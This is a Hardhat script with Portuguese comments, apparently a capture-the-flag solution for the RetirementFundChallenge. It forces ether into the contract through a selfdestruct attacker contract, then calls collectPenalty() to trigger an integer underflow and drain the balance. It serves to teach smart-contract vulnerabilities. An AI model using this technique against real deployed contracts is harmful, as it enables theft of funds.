const hre = require("hardhat");

async function main() {
  console.log("ğŸ” Iniciando exploit do RetirementFundChallenge...\n");

  // O endereÃ§o do contrato pode ser passado como variÃ¡vel de ambiente
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("ğŸ“¦ Nenhum endereÃ§o fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer, player] = await hre.ethers.getSigners();
    
    // Deploy do contrato enviando 1 ether
    const RetirementFundChallenge = await hre.ethers.getContractFactory("challenges/11_math_retirement_fund/contracts/RetirementFundChallenge.sol:RetirementFundChallenge");
    const challenge = await RetirementFundChallenge.deploy(player.address, {
      value: hre.ethers.parseEther("1.0")
    });
    await challenge.waitForDeployment();
    contractAddress = await challenge.getAddress();
    
    console.log("âœ… Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const RetirementFundChallenge = await hre.ethers.getContractFactory("challenges/11_math_retirement_fund/contracts/RetirementFundChallenge.sol:RetirementFundChallenge");
  const contract = RetirementFundChallenge.attach(contractAddress);

  // Obter contas
  // O primeiro signer Ã© o deployer, o segundo Ã© o player (beneficiary)
  const [deployer, player] = await hre.ethers.getSigners();
  const attacker = player; // O player Ã© o beneficiary
  
  // Verificar estado antes do exploit
  const balanceBefore = await hre.ethers.provider.getBalance(contractAddress);
  // startBalance Ã© uma variÃ¡vel pÃºblica, entÃ£o podemos acessÃ¡-la como funÃ§Ã£o
  let startBalance;
  try {
    startBalance = await contract.startBalance();
  } catch (e) {
    // Se nÃ£o funcionar, vamos usar o saldo inicial (1 ether)
    startBalance = hre.ethers.parseEther("1.0");
  }
  const isCompleteBefore = await contract.isComplete();
  
  console.log("ğŸ“ EndereÃ§o do contrato:", contractAddress);
  console.log("ğŸ‘¤ Atacante (beneficiary):", attacker.address);
  console.log("");
  console.log("ğŸ“Š Estado antes do exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceBefore), "ETH");
  console.log("  - Start balance:", hre.ethers.formatEther(startBalance), "ETH");
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("âœ… O desafio jÃ¡ estÃ¡ completo!");
    return;
  }

  // VULNERABILIDADE: Integer underflow em collectPenalty()
  // Se address(this).balance > startBalance, entÃ£o startBalance - address(this).balance faz underflow
  // Em Solidity 0.4.21, underflow resulta em um nÃºmero muito grande
  // O require(withdrawn > 0) passarÃ¡ e podemos transferir todo o saldo
  
  console.log("ğŸ” Explorando integer underflow em collectPenalty()...\n");
  console.log("ğŸ’¡ EstratÃ©gia:");
  console.log("   1. Aumentar o saldo do contrato acima de startBalance usando selfdestruct");
  console.log("   2. Chamar collectPenalty() que calcula withdrawn = startBalance - balance");
  console.log("   3. Como balance > startBalance, withdrawn farÃ¡ underflow (nÃºmero muito grande)");
  console.log("   4. require(withdrawn > 0) passarÃ¡ e podemos transferir todo o saldo\n");
  
  // Passo 1: Criar um contrato atacante e enviar ether para o RetirementFundChallenge usando selfdestruct
  console.log("ğŸ“ Passo 1: Criando contrato atacante e enviando ether via selfdestruct...");
  
  const Attacker = await hre.ethers.getContractFactory("challenges/11_math_retirement_fund/contracts/Attacker.sol:Attacker");
  const attackerContract = await Attacker.deploy();
  await attackerContract.waitForDeployment();
  const attackerContractAddress = await attackerContract.getAddress();
  
  console.log("âœ… Contrato atacante deployado em:", attackerContractAddress);
  
  // Enviar algum ether para o contrato atacante e depois chamar selfdestruct
  // selfdestruct pode enviar ether para qualquer endereÃ§o, mesmo sem funÃ§Ã£o payable
  const amountToSend = hre.ethers.parseEther("0.1"); // Enviar 0.1 ETH
  
  console.log(`ğŸ“¤ Enviando ${hre.ethers.formatEther(amountToSend)} ETH para o contrato atacante...`);
  const sendTx = await attacker.sendTransaction({
    to: attackerContractAddress,
    value: amountToSend
  });
  await sendTx.wait();
  console.log("âœ… Ether enviado!\n");
  
  console.log("ğŸ’¥ Chamando selfdestruct para forÃ§ar ether para o RetirementFundChallenge...");
  const selfdestructTx = await attackerContract.attack(contractAddress);
  await selfdestructTx.wait();
  console.log("âœ… Selfdestruct executado!\n");
  
  // Verificar saldo apÃ³s selfdestruct
  const balanceAfterSelfdestruct = await hre.ethers.provider.getBalance(contractAddress);
  console.log("ğŸ“Š Saldo apÃ³s selfdestruct:", hre.ethers.formatEther(balanceAfterSelfdestruct), "ETH");
  console.log("ğŸ“Š Start balance:", hre.ethers.formatEther(startBalance), "ETH");
  console.log("");
  
  if (balanceAfterSelfdestruct <= startBalance) {
    console.log("âš ï¸  Saldo ainda nÃ£o Ã© maior que startBalance. Tentando novamente com mais ether...");
    // Criar outro contrato e enviar mais ether
    const Attacker2 = await hre.ethers.getContractFactory("challenges/11_math_retirement_fund/contracts/Attacker.sol:Attacker");
    const attackerContract2 = await Attacker2.deploy();
    await attackerContract2.waitForDeployment();
    
    const sendTx2 = await attacker.sendTransaction({
      to: await attackerContract2.getAddress(),
      value: hre.ethers.parseEther("0.5")
    });
    await sendTx2.wait();
    
    const selfdestructTx2 = await attackerContract2.attack(contractAddress);
    await selfdestructTx2.wait();
    
    const balanceAfterSelfdestruct2 = await hre.ethers.provider.getBalance(contractAddress);
    console.log("ğŸ“Š Saldo apÃ³s segundo selfdestruct:", hre.ethers.formatEther(balanceAfterSelfdestruct2), "ETH");
    console.log("");
  }
  
  // Passo 2: Chamar collectPenalty()
  console.log("ğŸ“ Passo 2: Chamando collectPenalty()...");
  console.log("   withdrawn = startBalance - address(this).balance");
  console.log("   Como balance > startBalance, withdrawn farÃ¡ underflow (nÃºmero muito grande)");
  console.log("   require(withdrawn > 0) passarÃ¡ e podemos transferir todo o saldo\n");
  
  const collectPenaltyTx = await contract.connect(attacker).collectPenalty();
  await collectPenaltyTx.wait();
  console.log("âœ… collectPenalty() confirmado!\n");

  // Verificar estado apÃ³s o exploit
  const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteAfter = await contract.isComplete();
  
  console.log("ğŸ“Š Estado apÃ³s o exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceAfter), "ETH");
  console.log("  - Desafio completo:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nğŸ‰ Desafio completado! O contrato foi esvaziado");
    console.log("\nğŸ’¡ A vulnerabilidade: collectPenalty() calcula withdrawn = startBalance - balance.");
    console.log("   Se balance > startBalance, withdrawn farÃ¡ underflow (nÃºmero muito grande).");
    console.log("   Podemos usar selfdestruct para forÃ§ar ether para o contrato, mesmo sem funÃ§Ã£o payable!");
  } else {
    console.log("\nâŒ Algo deu errado. O desafio nÃ£o foi completado.");
    console.log("ğŸ’¡ Verifique se o saldo do contrato Ã© maior que startBalance.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

